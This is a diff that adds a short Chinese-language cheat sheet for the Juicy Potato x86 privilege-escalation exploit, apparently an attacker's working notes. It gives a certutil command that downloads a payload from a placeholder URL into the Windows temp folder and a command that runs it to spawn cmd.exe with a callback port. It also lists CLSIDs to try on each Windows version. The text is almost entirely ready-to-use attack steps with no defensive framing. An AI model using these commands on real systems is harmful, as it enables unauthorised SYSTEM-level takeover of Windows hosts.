@@ -1,0 +1,31 @@
+项目地址:https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2
+>下载
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>执行，后面的CLSID可以替换
+C:\windows\temp\$badfile -l $callback_port -p c:\windows\system32\cmd.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+>Windows 7 Enterprise
+{e60687f7-01a1-40aa-86ac-db1cbf673334}
+{9b1f122c-2982-4e91-aa8b-e071d54f2a4d}
+>Windows 8.1 Enterprise
+{4991d34b-80a1-4291-83b6-3328366b9097}
+{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}
+>Windows 10 Enterprise
+{3e5fc7f9-9a51-4367-9063-a120244fbec7}
+{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}
+{4991d34b-80a1-4291-83b6-3328366b9097}
+>Windows 10 Professional
+{3e5fc7f9-9a51-4367-9063-a120244fbec7}
+{4991d34b-80a1-4291-83b6-3328366b9097}
+>Windows Server 2008 R2 Enterprise
+{9b1f122c-2982-4e91-aa8b-e071d54f2a4d}
+{e60687f7-01a1-40aa-86ac-db1cbf673334}
+>Windows Server 2012 Datacenter
+{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}
+{4991d34b-80a1-4291-83b6-3328366b9097}
+>Windows Server 2016 Standard
+{3e5fc7f9-9a51-4367-9063-a120244fbec7}
+{4991d34b-80a1-4291-83b6-3328366b9097}
+>补充（通用高成功率 CLSID）这些在多数系统都可以尝试：
+{3e5fc7f9-9a51-4367-9063-a120244fbec7}  // BITS
+{4991d34b-80a1-4291-83b6-3328366b9097}  // WinRM
+{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}  // Shell
